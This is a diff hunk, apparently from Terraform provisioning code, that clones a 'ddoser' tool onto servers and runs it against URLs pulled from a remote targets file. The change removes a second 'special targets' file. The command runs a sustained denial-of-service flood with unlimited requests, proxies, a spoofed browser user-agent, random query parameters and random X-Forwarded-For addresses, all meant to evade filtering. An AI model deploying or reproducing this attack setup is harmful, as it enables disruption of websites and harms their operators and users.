@@ -29,8 +29,8 @@ apt update && apt install -y ca-certificates curl gnupg lsb-release git python3 
 git clone https://github.com/taransergey/ddoser.git
 cd ddoser/
 pip3 install -r requirements.txt
-echo "python3 ./ddoser.py --target-urls-file ${var.targets_file_url} --target-urls-file ${var.special_targets_file_url} --concurrency ${var.ddoser_concurency} --timeout 20 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url "${var.proxy_file_url}" --restart-period 600 --random-xff-ip" > /root/command.sh
-python3 ./ddoser.py --target-urls-file ${var.targets_file_url} --target-urls-file ${var.special_targets_file_url} --concurrency ${var.ddoser_concurency} --timeout 20 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url "${var.proxy_file_url}" --restart-period 600 --random-xff-ip
+echo "python3 ./ddoser.py --target-urls-file ${var.targets_file_url} --concurrency ${var.ddoser_concurency} --timeout 20 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url "${var.proxy_file_url}" --restart-period 600 --random-xff-ip" > /root/command.sh
+python3 ./ddoser.py --target-urls-file ${var.targets_file_url} --concurrency ${var.ddoser_concurency} --timeout 20 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url "${var.proxy_file_url}" --restart-period 600 --random-xff-ip
 EOF
 
 }
